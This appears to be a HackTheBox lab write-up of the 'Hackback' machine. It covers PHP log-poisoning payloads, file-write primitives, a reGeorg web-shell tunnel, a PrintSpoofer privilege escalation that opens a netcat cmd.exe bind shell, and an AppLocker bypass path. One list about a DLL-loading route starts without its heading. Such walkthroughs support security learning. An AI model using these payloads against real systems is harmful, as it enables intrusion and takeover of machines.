<h2 id="attack-chain">Attack chain</h2>
<p>Hackback is one of the hardest machines on HackTheBox. The attack chain is long, multi-layered, and requires chaining multiple techniques:</p>
<ul>
<li>Web enumeration across multiple virtual hosts</li>
<li>JavaScript deobfuscation</li>
<li>Log poisoning for remote file include</li>
<li>SOCKS proxying through a web tunnel</li>
<li>Windows privilege escalation via token impersonation</li>
</ul>
<p><strong>Core</strong></p>
<ul>
<li>Every piece of information is a potential lead - hostnames, comments, error messages</li>
<li>When direct code execution is blocked, think about what IS allowed (file read, file write, directory list)</li>
<li>When outbound connections are blocked, think bind shells over reverse shells</li>
<li>Always enumerate what privileges you have - SeImpersonatePrivilege is almost always exploitable</li>
</ul>

<h2 id="php-log-poisoning">PHP Log Poisoning</h2>

<p>The <code>show</code> action reads a log file via PHP <code>include()</code>. The log is populated when users submit credentials to the phishing login page at <code>www.hackthebox.htb</code>. We control the <code>username</code> and <code>password</code> fields.</p>
<p><strong>Step 1: Verify PHP execution</strong></p>
<p>Posted to <code>http://www.hackthebox.htb</code> with:</p>
<pre><code>username: &lt;?php echo "test"; ?&gt;

</code></pre>
<p>Then called <code>action=show</code> - the username field executed as PHP. This confirms <strong>PHP log poisoning</strong> works.</p>
<p><strong>Step 2: Test execution functions</strong></p>
<pre><code class="language-php" data-language="php">&lt;?php system('whoami'); ?&gt;
</code></pre>
<p>Nothing returned - all execution functions are disabled via <code>php.ini</code>:</p>
<pre><code>disable_functions = phpinfo,exec,passthru,shell_exec,system,proc_open,popen,
curl_exec,curl_multi_exec,parse_ini_file,show_source,fsockopen,
socket_create,socket_connect,eval
</code></pre>
<p><strong>Step 3: Use allowed functions - directory listing</strong></p>
<pre><code class="language-php" data-language="php">&lt;?php echo print_r(scandir($_GET['dir'])); ?&gt;
</code></pre>
<p><strong>Step 4: Use allowed functions - file read</strong></p>
<pre><code class="language-php" data-language="php">&lt;?php include($_GET['file']); ?&gt;
</code></pre>
<p><strong>Step 5: Use allowed functions - file write</strong></p>
<pre><code class="language-php" data-language="php">&lt;?php $f = "BASE64_CONTENT"; file_put_contents("filename", base64_decode($f)); ?&gt;
</code></pre>

<p>Log poisoning works because the log file is included (not just read) by PHP. When PHP includes a file, it executes any PHP code found within it. The <code>init</code> action lets us reset the log when we make mistakes, avoiding the need to reset the entire box.</p>
<p>The disabled function list blocks direct code execution but NOT file system operations. <code>scandir</code>, <code>include</code>, and <code>file_put_contents</code> are all available - giving us directory listing, file reading, and file writing as three distinct primitives.</p>
<p> When code execution is blocked, think about what IS allowed. File system access (read/write/list) is often overlooked but extremely powerful. These three primitives together give you complete filesystem control without needing <code>system()</code> or <code>exec()</code>.</p>

<h2 id="uploading-regeorg-tunnel">Uploading reGeorg Tunnel</h2>

<p>reGeorg is a tool that creates a SOCKS proxy tunnel through a web shell (PHP, ASPX, JSP). We upload <code>tunnel.aspx</code> to the target and connect to it with <code>reGeorgSocksProxy.py</code>, which creates a local SOCKS proxy that tunnels all traffic through the web server.</p>
<p>We used our file write primitive (via log poisoning + <code>file_put_contents</code>) to upload <code>tunnel.aspx</code>:</p>
<pre><code class="language-python" data-language="python"># hackback_shell.py - automated the upload
python3 hackback_shell.py upload /path/to/tunnel.aspx tunnel.aspx
</code></pre>
<p>Or manually via Burp/curl - base64 encode tunnel.aspx and inject:</p>
<pre><code class="language-php" data-language="php">&lt;?php $f = "BASE64_OF_TUNNEL_ASPX"; file_put_contents("tunnel.aspx", base64_decode($f)); ?&gt;
</code></pre>
<p>We used ASPX (not PHP tunnel) because PHP's socket functions were disabled.</p>
<h3 id="why-we-chose-aspx-over-php">Why we chose ASPX over PHP</h3>
<p>PHP's <code>disable_functions</code> includes <code>fsockopen</code> and <code>socket_create</code> - the functions reGeorg's PHP tunnel needs. The ASPX tunnel uses .NET's <code>System.Net.Sockets</code> which bypasses PHP restrictions entirely.</p>
<p> When one language's execution is restricted, the other language running on the same server may not have the same restrictions. PHP and ASP.NET have independent configuration. Always try both.</p>

<h2 id="tunneling-through-regeorg-to-winrm">Tunneling Through reGeorg to WinRM</h2>

<p><strong>Step 1: Start reGeorg SOCKS proxy</strong></p>
<pre><code class="language-bash" data-language="bash">python2 reGeorg/reGeorgSocksProxy.py -p 1080 -u http://admin.hackback.htb/REDACTED_HASH_OR_FLAG/tunnel.aspx
</code></pre>
<p>This creates a SOCKS4 proxy on <code>127.0.0.1:1080</code>. All traffic sent through this proxy gets forwarded through the ASPX tunnel running on the target web server.</p>
<p><strong>Step 2: Configure proxychains</strong></p>
<p><code>/etc/proxychains4.conf</code>:</p>
<pre><code>strict_chain
proxy_dns
[ProxyList]
socks4  127.0.0.1 1080
</code></pre>
<p><strong>Step 3: Connect via Evil-WinRM through the tunnel</strong></p>
<pre><code class="language-bash" data-language="bash">proxychains evil-winrm -i 127.0.0.1 -u simple -p REDACTED
</code></pre>
<p>Why <code>127.0.0.1</code>? Because proxychains intercepts the connection and routes it through the SOCKS proxy. The proxy then connects from the web server (which is on the same network as WinRM) to <code>127.0.0.1:5985</code> on the target.</p>

<p>The web server and WinRM are on the same host. The ASPX tunnel can make internal connections that bypass the external firewall. We're essentially using the web server as a pivot point:</p>
<pre><code>Kali → [reGeorg Python proxy :1080] → HTTP → [tunnel.aspx on target] → TCP → WinRM :5985
</code></pre>
<p> A SOCKS proxy through a web shell is one of the most powerful pivoting techniques. The web server becomes your network access point. Any service that's accessible from the web server but not from the internet becomes reachable through this tunnel.</p>

<h2 id="privilege-escalation-simple-to-system-via-printspoofer">Privilege Escalation - simple to SYSTEM via PrintSpoofer</h2>

<p><strong>The original intended path</strong> (named pipe impersonation via scheduled task) proved unreliable on this instance because the scheduled task runs very infrequently (~once per 12 hours after boot). We used a more direct technique.</p>
<p><strong>PrintSpoofer</strong> exploits the Windows Print Spooler service to escalate from <code>SeImpersonatePrivilege</code> to SYSTEM on Windows Server 2019+.</p>
<p><strong>Step 1: Verify Print Spooler is running</strong></p>
<pre><code class="language-powershell" data-language="powershell">sc query spooler
# STATE: 4 RUNNING
</code></pre>
<p><strong>Step 2: Download PrintSpoofer on Kali</strong></p>
<pre><code class="language-bash" data-language="bash">wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer64.exe
</code></pre>
<p><strong>Step 3: Upload via Evil-WinRM</strong></p>
<pre><code class="language-powershell" data-language="powershell">upload PrintSpoofer64.exe
copy PrintSpoofer64.exe C:\windows\system32\spool\drivers\color\PrintSpoofer64.exe
</code></pre>
<p><strong>Step 4: Spawn SYSTEM bind shell</strong></p>
<pre><code class="language-powershell" data-language="powershell">C:\windows\system32\spool\drivers\color\PrintSpoofer64.exe -c "C:\windows\system32\spool\drivers\color\nc.exe -e cmd.exe -lvp 5555"
</code></pre>
<p><strong>Step 5: Connect from Kali</strong></p>
<pre><code class="language-bash" data-language="bash">proxychains nc 127.0.0.1 5555

</code></pre>
<h3 id="how-printspoofer-works">How PrintSpoofer works</h3>
<p>PrintSpoofer abuses the Windows Print Spooler named pipe impersonation:</p>
<ol>
<li>Creates a named pipe server with a specific name</li>
<li>Triggers the Print Spooler service (running as SYSTEM) to connect to the pipe using <code>ImpersonateNamedPipeClient</code></li>
<li>Since the Spooler runs as SYSTEM, the impersonated token is a SYSTEM token</li>
<li>Uses that SYSTEM token to spawn a new process (our nc.exe bind shell)</li>
</ol>
<p>The exploit path:</p>
<pre><code>simple (SeImpersonatePrivilege) → trick SYSTEM (Print Spooler) into connecting to our pipe
→ impersonate SYSTEM token → spawn cmd.exe as SYSTEM
</code></pre>
<h3 id="why-printspoofer-over-juicypotato">Why PrintSpoofer over JuicyPotato</h3>
<p>JuicyPotato (the classic SeImpersonatePrivilege exploit) doesn't work on Windows Server 2019 because Microsoft patched the DCOM activation vulnerability it relied on. PrintSpoofer uses a completely different attack vector (Print Spooler named pipe) that remained unpatched on this OS version.</p>
<h3 id="applocker-bypass">AppLocker bypass</h3>
<p>PrintSpoofer was uploaded to <code>C:\windows\system32\spool\drivers\color\</code> - the AppLocker bypass location used throughout this box. Since this directory is in System32 (trusted) but writable by non-admins, AppLocker allows execution from it.</p>
<p> Know your OS version and which exploits apply. Windows Server 2019 killed JuicyPotato but PrintSpoofer/RoguePotato/GodPotato still work. Always use bind shells when outbound is blocked. The AppLocker bypass location (<code>spool\drivers\color</code>) is one of the most reliable on Windows.</p>

<h2 id="capturing-the-flags">Capturing the Flags</h2>
<h3 id="user-flag">User Flag</h3>
<pre><code class="language-cmd" data-language="cmd">type C:\Users\hacker\Desktop\user.txt
# 922449[redacted]1e99cfe
</code></pre>
<p>The user flag is in hacker's Desktop. As SYSTEM, we can read any file on the system regardless of ACLs.</p>
<h3 id="root-flag-alternate-data-stream">Root Flag - Alternate Data Stream</h3>
<pre><code class="language-cmd" data-language="cmd">more &lt; C:\Users\administrator\Desktop\root.txt:flag.txt
# 6d29b0[redacted]2f7d02515
</code></pre>
<p>The root flag is hidden in an <strong>Alternate Data Stream (ADS)</strong>. On NTFS, files can have multiple data streams. The default stream is what you see with <code>type</code> or <code>dir</code>, but additional named streams (like <code>:flag.txt</code>) are hidden from normal file operations.</p>
<p>Why <code>more &lt;</code> instead of <code>type</code>? The <code>type</code> command doesn't support ADS syntax. <code>more</code> with input redirection does.</p>
<p> On Windows CTF challenges, always check for Alternate Data Streams when a file seems empty or when the flag doesn't appear where expected. Use <code>dir /r</code> to list all streams, or <code>more &lt; file:stream</code> to read them.</p>

<li><code>UserLogger</code> runs as SYSTEM and creates log files wherever told, with <code>Everyone:FullControl</code> ACL</li>
<li>Start service: <code>sc start userlogger c:\windows\system32\exploit.dll</code><br>(it appends <code>.log</code> to the argument, creating <code>exploit.dll.log</code> with open ACLs)</li>
<li>Use the arbitrary write primitive to write a malicious DLL as <code>license.rtf</code> in System32</li>
<li>Invoke DiagHub (DCOM diagnostic service) to load <code>license.rtf</code> as a DLL (it doesn't check extensions)</li>
<li>DiagHub loads the DLL as SYSTEM → shell as SYSTEM</li>
</ol>
<h3 id="why-we-deviated">Why we deviated</h3>
<p>The scheduled task ran only once after machine boot (~12 hours post-reboot based on observed behavior), making the named pipe approach impractical for a time-constrained session. <code>SeImpersonatePrivilege</code> was available on <code>simple</code> and PrintSpoofer provided a faster, more reliable path directly to SYSTEM.</p>
<hr>
<h2 id="key-lessons">Key Lessons</h2>
<h3 id="enumeration">Enumeration</h3>
<ul>
<li>Always check all ports including unusual ones (6666 in this case)</li>
<li>Virtual host enumeration is critical on IIS servers</li>
<li>JS comments and disabled links in HTML source contain developer breadcrumbs</li>
<li><code>.old</code> and <code>.bak</code> files often contain credentials</li>
</ul>
<h3 id="web-exploitation">Web Exploitation</h3>
<ul>
<li>When <code>system()</code>, <code>exec()</code> etc. are disabled in PHP, file system primitives (<code>scandir</code>, <code>include</code>, <code>file_put_contents</code>) still give significant access</li>
<li>Log poisoning requires careful control of the log content - use <code>init</code> or similar to clean between attempts</li>
<li>If PHP socket functions are disabled, ASP.NET on the same server may not have the same restrictions</li>
<li>Always note when multiple server-side languages are running simultaneously</li>
</ul>
<h3 id="tunneling-and-pivoting">Tunneling &amp; Pivoting</h3>
<ul>
<li>reGeorg SOCKS proxy through ASPX shells is highly effective for reaching internal services</li>
<li>proxychains routes all TCP traffic through the configured proxy</li>
<li>Internal services (WinRM, RDP, SMB) become accessible once you have a tunnel</li>
</ul>
<h3 id="windows-privilege-escalation">Windows Privilege Escalation</h3>
<ul>
<li><code>SeImpersonatePrivilege</code> is almost always exploitable - know the current tools (JuicyPotato→PrintSpoofer→GodPotato evolution)</li>
<li>Check OS version before choosing exploit: Server 2019 requires PrintSpoofer/RoguePotato, not JuicyPotato</li>
<li>AppLocker bypass: <code>C:\windows\system32\spool\drivers\color\</code> is writable by non-admins and trusted</li>
<li>Firewall blocking outbound = bind shells only</li>
</ul>
<h3 id="ntfs-alternate-data-streams">NTFS Alternate Data Streams</h3>
<ul>
<li>Flags and sensitive data can be hidden in ADS: <code>file.txt:hidden_stream</code></li>
<li><code>dir /r</code> lists all streams</li>
<li><code>more &lt; file:stream</code> reads a named stream</li>
<li><code>type</code> does not work with ADS</li>
</ul>
